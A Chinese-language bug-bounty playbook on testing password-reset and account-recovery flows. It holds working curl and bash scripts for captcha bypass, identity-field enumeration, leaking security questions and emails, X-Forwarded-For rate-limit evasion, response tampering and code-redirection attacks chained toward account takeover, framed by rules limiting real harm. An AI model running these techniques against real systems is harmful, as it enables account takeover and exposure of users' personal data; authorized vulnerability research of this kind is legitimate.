# 密码重置 / 账号找回 / 账号申诉

> 定位：**不依赖登录态、不依赖双账号、直通账号接管**——无测试账号时的首选突破口。
> 与 `authbypass-test.md` 分工：那边管「未登录改密口」「IDaaS 未占用密保题」「换票」这类**单点接口**；本篇管**整条找回流程的状态机**。
> 与 `logic-test.md` §4.2 分工：那边是 10 行概述，本篇是正文。
> 冲突以 `rules/src-value-hunting.md` 与 `rules/vuln-report-format.md` 为准。
> **实战案例（双向引用）** → `logic-web-cases.md` **§6**（密码重置 7 类：五类成因 §6.1 / 分步跳步·响应篡改 §6.2 / uid·身份参数越权改密 §6.3 / 注册激活凭证回显 §6.4 / 学号账号回显链 §6.5）；另见 `idor-cases.md`「任意密码重置 9 类」与 `edusrc-cases.md` §2.1（弱校验找回密码接管师生账号）。

## 铁律（不可违反）

1. **绝不实际重置他人密码**。证明到「校验接口返回 true / 可跳转改密页」即停手。
2. **绝不爆破真实账号**。用**不存在的账号**验证逻辑分支；注意账号锁定策略。
3. **限频测试控制在功能验证量级**（≤100 次请求），不做 DoS。
4. **改密过了立刻改回**（对齐 SKILL.md 安全红线 2），改不回就停在回包，不要把用户号改死。
5. **假设与结论分离**：区分「已验证」与「待验证假设」。

## 一、流程测绘（先画状态机）

典型 4 步：

```
① 身份校验（账号 + 姓名 + 身份证 / 密保问题 / 邮箱手机）
      ↓ 返回 true
② 跳转改密页（常带 phoneType / token 参数）
      ↓
③ 提交新密码
      ↓
④ 完成
```

**逐步骤提问**：
- ① 的校验参数能否枚举？有无验证码？有无频控？
- ② 能否跳步直达？（去掉 ① 直接访问改密页）
- ② 的 token / 流水号是否可预测、可跨会话复用、是否绑定用户？
- ③ 提交时是否二次校验身份？

**抓全量接口**：读前端 JS，找 `$.ajax` / `axios` 的 `url` 与 `data` 字段。衔接 `js-reverse-guide.md`。

## 二、验证码缺陷（命中率极高）

### 2.1 明文回显（一枪致命）

```bash
# 先取图（建立会话，同时生成验证码）
curl -s -k -c s.txt "https://T/safe/image.jsp" -o /dev/null
# 再取码 —— 若返回明文即漏洞
curl -s -k -b s.txt "https://T/safe/yanzhengma.jsp?0.123"
# 返回: 0318   ← 4位明文
```

**判定**：
- 返回纯文本（`Content-Length: 4`）= 明文回显
- 连续请求**值不变** = 不刷新
- 若返回 PNG/JPEG 二进制 = 安全

### 2.2 仅前端校验（关键判据）

**看下一步接口的参数列表里有没有验证码字段。**

```javascript
// 前端：在浏览器 JS 里比对
success: function(message) {
    if (yan != message.trim()) { 显示错误; return; }
    else { jyzhxx(account,xm,myname,orgname); }   // 下一步
}
// 下一步的参数：account / myname / xm / orgname
// → 没有 captcha！服务端根本不校验
```

### 2.3 服务端零校验的「决定性证明」（写报告必备）

仅证明「前端比对」还不够硬。**最强证据：在一个全新会话里，从头到尾不请求 `image.jsp`**（服务端因此从未生成过验证码），直接提交任意值：

```bash
rm -f sv.txt
# 只取 fcode，绝不请求 image.jsp
curl -s --noproxy '*' -k -c sv.txt "https://T/safe/findbyquestion.jsp" -o q.html
FC=$(grep -oE 'value="[0-9]{15,20}" name="fcode"' q.html | grep -oE '[0-9]{15,20}')

curl -s --noproxy '*' -k -b sv.txt -X POST "https://T/safe/findbyway.jsp" \
  -d "fcode=$FC&account=admin&myname=&yanimage1=0000" -w "\nhttp=%{http_code} len=%{size_download}\n"
# http=200 len=8746  ← 返回了完整的密保问题页面
```

**逻辑闭环**：验证码从未生成 → 服务端无从比对 → 却放行 → **服务端零校验**，无任何解释空间。

### 2.4 其他验证码问题
- 不失效 / 可复用（验证成功后同一码再用于其他流程）
- 万能码：`000000` `111111` `123456` `888888` `666666`
- 未绑定归属：A 的码配 B 的手机号提交

### 2.5 对比验证（防误判）

同厂商常有「做对的」模块。**对比登录页与找回页的验证码实现**：
- 登录页 `captcha.jsp` 返回真实 PNG、每次不同 → 安全
- 找回页 `yanzhengma.jsp` 返回明文、固定 → 漏洞

→ 证明是该模块**独立缺陷**，不是平台通病，报告更站得住。

## 三、身份校验接口枚举

### 3.1 响应语义测绘（必做）

先建立**基准可复现请求**，再逐字段隔离：

| 测试 | 目的 |
|------|------|
| 完整参数 + 有效会话 | 建立基准 |
| 去掉会话 Cookie | 判断是否需登录态 |
| 去掉 token / fcode | 判断是否真校验 |
| 去掉 Referer | 判断是否有来源校验 |
| 换 GET 方法 | 判断方法限制 |
| 改校验参数为**无效值** | ⚠️ **关键**：无效值常返回空，导致误判「响应不可区分」 |

**踩坑记录**：曾因使用无效的 `orgname=1` + 未维持会话，误判接口「响应恒为空、不可区分」。换成有效枚举值后立即返回 `false`。

### 3.2 枚举值获取

下拉框（`<select>`）的 `<option value>` 就是有效枚举值，**必须用真实值**：
```bash
curl -s -k "https://T/safe/findPassByOther.jsp" | grep -oE "<option value='[^']*'"
```

### 3.3 响应分支

| 响应 | 含义 |
|------|------|
| `false` | 不匹配 |
| `true` | **命中** → 可跳改密页 |
| 空 | 会话缺失 或 枚举值无效 |

### 3.4 身份字段「逐个独立性」验证（最高产的一步，别跳过）

找回流程通常要求多个身份字段（账号 + 姓名 + 身份证号）。**绝大多数人只测「整组参数对不对」，而真正的高产缺陷是——其中某个字段服务端根本没读。**

**做法**：固定账号不变，**逐个字段**替换为 4 类畸形值，看是否照样通过：

| 畸形值 | 作用 |
|---|---|
| **空值** | 字段被忽略 / 未参与校验 |
| `abc`（类型错误） | 无类型校验 |
| `1` / `x`（长度错误） | 无长度校验 |
| `111111111111111111` / `000000000000000000`（18 位占位） | 无格式 / 真实性校验 |

```bash
# 固定 account，逐个畸形 myname（身份证号）
for m in "" "abc" "1" "111111111111111111" "000000000000000000"; do
  curl -s --noproxy '*' -k -b s.txt -X POST "https://T/safe/findbyway.jsp" \
    -d "fcode=$FC&account=admin&myname=$m&yanimage1=1234" -o r.html
  echo "myname=[$m] -> $(grep -oE 'id="question"[^>]*>[^<]*' r.html | sed 's/.*>//')"
done
```

**全部返回正常内容 = 该字段完全不校验**（实测 5/5 全通过，身份证号形同虚设）

⚠️ **判定前提**：必须同时跑一个**对照请求**（`account=不存在的账号`）确认响应确实不同，否则可能只是「接口恒返回固定页面」的误判。

### 3.5 响应差异 → 泄露字段挖掘

拿**存在的账号**与**不存在的账号**各跑一次，**diff 两份响应**，差集里就是泄露的敏感字段：

```bash
diff <(curl -s ... account=admin) <(curl -s ... account=test) | head -40
```

实测 diff 直接暴露出：
- 明文密保问题：`问题：您常用的QQ号码是多少`
- 脱敏绑定邮箱：`邮箱验证707****80@qq.com`
- 预填账号的邮件找回表单

## 四、自助接口（申诉 / 绑定 / 查询）—— 高价值常被忽略

密码找回流程旁边通常还有**账号申诉（appeal）、密保绑定检查、邮箱找回**等自助接口。这些接口常因「不涉及登录」而被开发者忽视鉴权与字段脱敏，**命中率很高**。

### 排查清单
```
appeal.jsp / appeal.jsp?cmd=validate   账号申诉（采集姓名/身份证/手机/邮箱）
findbyemail.jsp                        邮箱找回
checkquestionbinding.jsp               密保绑定检查
safeSet.jsp / updatepwd.jsp            安全设置
```

### 典型缺陷：校验失败仍返回敏感字段

**关键测试**：故意让校验**失败**（姓名 / 身份证填错），看响应里**还有没有敏感字段**。

```bash
# 用不存在的账号
curl -s -X POST "https://T/safe/appeal.jsp?cmd=validate" -d "jobNumber=test"
# {"state":"error","emailaddress":"","error":{"jobNumber":"无效用户"}}

# 用可能存在的通用标识
curl -s -X POST "https://T/safe/appeal.jsp?cmd=validate" -d "jobNumber=admin"
# {"state":"error","emailaddress":"707866480@qq.com","error":{"userName":"姓名不符"}}
#                        ↑ state=error，但邮箱已泄露！
```

**两个缺陷同时成立**：
1. **敏感字段泄露** —— 校验失败（`state:error`）时仍返回 `emailaddress`
2. **账号枚举** —— `无效用户` vs `姓名不符` 可区分账号存在性

### 参数最小化（必做）

逐步删参数，找出**最少需要几个参数**。很多接口只校验第一个字段就返回全部信息：
```bash
jobNumber=admin                                    # 只剩一个也能打
```

### 判定要点
- 泄露**邮箱 / 手机号**属个人信息 → **不是**「无意义信息泄露」，可交
- 工号 / 学号是**半公开**的（名单、公示）→ 可枚举，危害成立
- 与密码重置链串联：本漏洞提供**有效账号**，重置缺陷提供**无限尝试**

### 通用标识探测词（少量、不批量）
```
admin  test  guest  root  administrator  user  demo
```
⚠️ 仅用于验证机制，**不做批量枚举**（避免踩「撞库 / 枚举」红线）。

## 五、限频识别与绕过

> 详细手法另见 `ratelimit-abuse-test.md`。本节只保留找回链上的用法。

### 5.1 先测阈值
```bash
for i in $(seq 1 30); do
  curl -s -k -b s.txt -X POST "https://T/api" -d "..." | tr -d '\r\n'; echo
done
# 观察第几次开始返回「非法操作」「访问频繁」「请稍后再试」
```

### 5.2 再定维度 —— 逐个伪造头试
```bash
for h in "X-Forwarded-For" "X-Real-IP" "Client-IP" "X-Client-IP" "X-Originating-IP" "True-Client-IP" "Forwarded"; do
  r=$(curl -s -k -b s.txt -X POST "https://T/api" -H "$h: 1.1.1.1" -d "..." | tr -d '\r\n')
  echo "$h -> $r"
done
```
**若返回正常（非封禁文案）→ 该头可绕过。**

### 5.3 持续绕过验证
```bash
ok=0; blocked=0
for i in $(seq 1 25); do
  XFF="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
  r=$(curl -s -k -b s.txt -X POST "https://T/api" -H "X-Forwarded-For: $XFF" -d "..." | tr -d '\r\n')
  [ "$r" != "false" ] && blocked=$((blocked+1)) || ok=$((ok+1))
done
echo "成功=$ok 被拦=$blocked"
# 25/25 成功 → 限频完全失效
```

## 六、Token / 流水号分析

```bash
# 多次采样，看规律
for i in 1 2 3 4 5; do
  curl -s -k "https://T/page.jsp" | grep -oE 'value="[0-9]{15,25}" name="fcode"' | sed 's/value="//;s/".*//'
done
```

**常见规律**：
- `YYYYMMDDHHMMSS` + N 位随机数（时间戳型，**熵仅 10^N**）
- 自增 ID
- `MD5(手机号)` / `MD5(时间戳)`

**实测样例**（同一目标两种令牌，规律一致）：
```
fcode   202609122025289957  →  20260912202528 + 9957
fcode   202609122025389809  →  20260912202538 + 9809
waycode 202609122029044403  →  20260912202904 + 4403
```
前 14 位是明文时间戳，**实际熵只有 10⁴**。即使当前绑定了会话无法直接利用，也应在报告中指出「令牌强度不足以承担防重放职责」。

**必测四项**：
1. 是否**服务端校验**？（传 / 不传 / 传伪造值，看响应是否一致）
2. 是否**可跨会话复用**？（A 会话取的 token 拿 B 会话用）
3. 是否**绑定用户**？（A 的 token 换 B 的账号）
4. 是否**单次有效**？（同 token 连发两次，第二次是否被拒）

**踩坑提示**：`fcode` 这类令牌常**同时**绑定会话且单次有效（复用返回 302）。此时它不构成漏洞，**不要硬凑危害**；如实写「熵不足」即可。

**假点**：token 绑会话 + 单次有效 + 不可预测 → 无洞。别硬报。

## 七、跳步与参数可改（衔接 `dig-scope` §4.2.2）

| 形态 | 打法 |
|---|---|
| 步骤参数（`step=1/2/3`） | 直接从 `step=1` 跳到 `step=3` |
| 验证码步可跳过 | 去掉验证码请求，直接 POST 设密口 |
| 手机号在 body 里 | 换成自己的号收码，重置别人的账号 |
| 用户 id 在 body 里 | 换 id 打别人的重置流程 |
| 码与号不同步 | A 的手机收的码 + B 的手机号提交 |
| 重置邮件链接用 Host 拼 | 改 `Host` / `X-Forwarded-Host` 收链（见 `http-host-header-test.md`） |

**重置后必查**：旧会话是否失效（不失效 = 会话固定类）、重置后能否直接登录（有无二次验证）。

### 7.1 响应包改状态值绕过（前端 UI 决策字段，后端不二次校验）

**根因**：服务端把「是否已通过某步验证」这个本该自己维护的状态，委托给前端返回（如 `verified` / `showResetPassword` / `passed` 之类 JSON 字段）。服务器收到后**不溯源、不二次验证**，直接信了。

```http
# ① 验证码步：把 false 改成 true 就能过
{"verified":false}  →  {"verified":true}
{"passed":0}        →  {"passed":1}
{"code":401,"msg":"验证失败"}  →  {"code":0,"msg":"ok"}   # 改状态码

# ② 前端 UI 开关：后端返回 false 仅用于"是否渲染重置按钮"，无后端鉴权
{"showResetPassword":false,...}  →  {"showResetPassword":true,...}
# 改完刷新页面 → 前端渲染出重置密码入口 → 对自己账号重置返回 200 + 有效链接
```

**判定（与登录框改响应包同判定，见 `login-bypass-playbook.md` §2）**：
- 改完**真的进去了、能出后续功能** → 后端确实没校验 → 洞成立
- 只改了显示、**刷新又回登录页/又回校验页** → 后端校验了，这是假点，**不算洞**

**高价值信号**：抓包看到响应体里有 `verified` / `passed` / `isAuth` / `showXxx` / `enableXxx` 这类**布尔/开关字段** → 优先改它试试。

### 7.2 接收端参数污染 + 步骤间身份不一致（账号与校验参数未绑定）

**根因**：发送验证码的请求里，接收端（手机/邮箱）由客户端参数指定，且**前后步骤的 user_name / id 不互校**。

```http
# ① 参数污染（双值）：系统取最后一个 / 拼接
POST /sendCode   phone=victim_phone&phone=attacker_phone   → 码发到 attacker_phone
POST /sendCode   email=victim@x.com&email=attacker@x.com

# ② 间接关联：第一步 user_name=target，发码步 user_name 被改成 attacker
POST /sendCode   user_name=attacker     # 系统把码发到 attacker 绑定的手机
# 只校验"验证码本身对不对"，不校验"码是给谁发的" → 用 attacker 收到的码重置 target

# ③ 收码方直接可控（最干净）
POST /getCode   {"phone":"attacker_phone"}   # 凭空指定接收方，与要重置的账号无关
```

**判定**：用自己两个号 A/B 验证——A 发起重置、把接收端改成 B 的手机、B 收到码、用 B 收到的码能否完成**对 A** 的重置。能 = 接收端与账号未绑定，严重。

> **参数名速查**：接收端直接参数 `phone`/`mobile`/`phoneNumber`/`email`/`mail`/`to`/`receiver`；间接参数 `user_id`/`uid`/`id`/`username`/`user_name`/`login_name`/`account`。

## 八、串联与定级

### 攻击链模板
```
验证码缺陷（明文/前端校验/零校验）
    ↓ 绕过验证码
限频缺陷（XFF 可绕过）
    ↓ 无限次尝试
身份校验接口枚举（账号+姓名+身份证）
    ↓ 命中 true
跳转改密页 → 密码重置 → 账户接管
    ↓ 强化
结合泄露的初始密码规则（使用手册/文档）→ 更易命中
```

### 定级参考

**定级只认 `rules/vuln-report-format.md`「漏洞等级」那一格。** 下表仅为对齐直觉，冲突以 format 为准。

| 场景 | 等级 |
|------|------|
| 可重置任意用户密码（已验证） | 严重 |
| 可枚举身份信息 + 验证码/限频缺陷（链路完整但未实际重置） | 高危 |
| 身份校验字段（身份证号）完全不校验 + 未授权泄露密保问题/绑定邮箱 | 中危偏高 |
| 仅验证码明文回显（无其他串联） | 中危 |
| 仅限频缺失（无敏感操作） | 低危~中危 |

**定级纪律**：若闭环**未打通**（如改密页有服务端会话态校验、令牌绑会话），**必须如实写明「未完成账号接管」**，并把「若 X 成立则可提级」作为**待验证假设**单列。宁可报中危，不可虚报严重。

### 定性纪律（EDUSRC 类平台）
平台常有「信息泄露仅收身份证和密码」的收录口径。若你的发现本质是「密码找回流程的身份校验失效」，**务必按「认证逻辑缺陷」定性**：
- ❌ 标题写「XX 系统敏感信息泄露」→ 容易被按信息泄露口径拒收
- ✅ 标题写「XX 系统密码找回流程身份校验失效（验证码可绕过 + 身份证号不校验）」→ 密保问题泄露是**后果**，不是漏洞本身

### 佐证合并，绝不拆分提交

平台明令禁止拆分提交（同一目标、同一业务链的多个缺陷拆成多份报告 → 判违规）。

| 边缘发现的典型形态 | 单独提交的结局 | 正确处理 |
|---|---|---|
| 未授权页面渲染出**枚举值表** | 判「无意义信息泄露」忽略 | **并入主链**：写明它把枚举空间从「未知」降为「N 值」 |
| 关联资产 **Actuator 未授权**（只开 health/info） | 判「无意义信息泄露」忽略 | **并入主链**：写明它泄露了后端技术栈/版本 |
| 应用信息泄露（Git commit / banner） | 判「无意义源码泄露」忽略 | 同上，仅作佐证 |
| 服务不可用（全站 501/502） | 判「非安全漏洞」 | **不提交** |

**判定口诀**：一个发现如果不能**独立构成**「敏感数据泄露（身份证/密码/可登录凭据）」或「认证/授权逻辑失效」，就**只能当佐证**。

## 九、环境陷阱

- **透明代理**：若环境有 `http_proxy`/`https_proxy`，curl 必须加 `--noproxy '*'`，否则 HTTPS 被劫持返回错误内容 → 资产误判。**代理端口会变**，每次会话先 `env | grep -i proxy` 确认。
- **封禁页伪装**：WAF 封禁响应可能带**伪造 banner**（实测 `Server: Microsoft-IIS/6.6666666666`）。**别把它当真实指纹写进报告**。带 `X-Forwarded-For` 再请求，穿过后露出的才是真实容器。
- **自己会被封**：限频测试会把自己的出口 IP 打进黑名单，**后续所有请求都要带 XFF**，否则拿到的一律是封禁页（长度固定，如 71 字节），极易误判为「接口不存在」。
- **Cookie 罐的 `#HttpOnly_` 前缀**：`grep -v '^#' cookie.txt` 会把 HttpOnly cookie 一起过滤掉。用 `grep JSESSIONID cookie.txt` 直接找。
- **`/tmp` 在 Git Bash 下可能不可写**：中间文件放到工作目录下的临时目录。

## 十、自检

- [ ] 是否画全了找回流程的状态机（4 步都抓到了）？
- [ ] 验证码是否测了**明文回显**与**服务端零校验**（全新会话不请求验证码图）？
- [ ] 身份字段是否做了**逐个独立性**验证（空/类型/长度/占位四类）？
- [ ] 有没有跑**对照请求**（不存在的账号）防止「接口恒返回固定页」误判？
- [ ] 是否 diff 了「存在账号」与「不存在账号」的响应？
- [ ] 自助接口（申诉/绑定）**校验失败时**是否还返回敏感字段？
- [ ] 限频维度是否逐个伪造头测过？
- [ ] token 四项（服务端校验/跨会话/绑用户/单次有效）是否都测了？
- [ ] 有没有把「绑会话 + 单次有效」的 token 硬凑成漏洞？
- [ ] 定级是否**如实写明未打通的环节**，没有虚报严重？

## 十一、一句话

**先画状态机；验证码打「零校验」这一枪最硬；身份字段逐个拆着测；申诉口看「校验失败还剩什么」；token 四项全测；未打通就如实报中危。**
